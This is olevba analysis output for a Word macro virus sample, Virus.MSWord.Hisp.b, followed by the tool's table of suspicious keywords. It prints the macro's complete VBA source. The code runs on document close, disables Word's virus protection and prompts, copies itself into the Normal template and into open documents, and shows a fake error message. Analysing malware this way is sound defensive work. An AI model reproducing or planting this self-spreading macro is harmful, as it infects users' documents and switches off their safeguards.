olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hisp.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hisp.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hearer
Private Sub Document_close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'Hearer" Then
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
    End If
    If AD.Lines(1, 1) <> "'Hearer" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
    If (Day(Date) >= 16) Then
     MsgBox "Îøèáêà 1340", vbOKOnly
    End If
    ActiveDocument.Save
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

